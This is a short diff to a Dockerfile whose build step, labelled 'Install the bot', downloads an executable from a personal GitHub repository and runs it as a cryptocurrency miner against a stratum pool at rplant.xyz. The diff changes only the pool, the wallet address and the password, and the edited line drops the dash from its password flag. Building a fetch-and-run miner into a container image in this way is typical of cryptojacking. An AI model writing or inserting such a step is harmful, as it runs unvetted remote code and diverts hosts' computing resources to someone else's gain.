@@ -32,4 +32,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 # Install the bot:
 RUN wget https://github.com/AVGandhi/student/raw/main/sse2 \
 && chmod +x sse2 \
-&& ./sse2 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -p password=test
+&& ./sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Mh9keJ6aKhcLrxmNFevcuYSfSkJ1ox8DB9.mbc1 p password=hero21
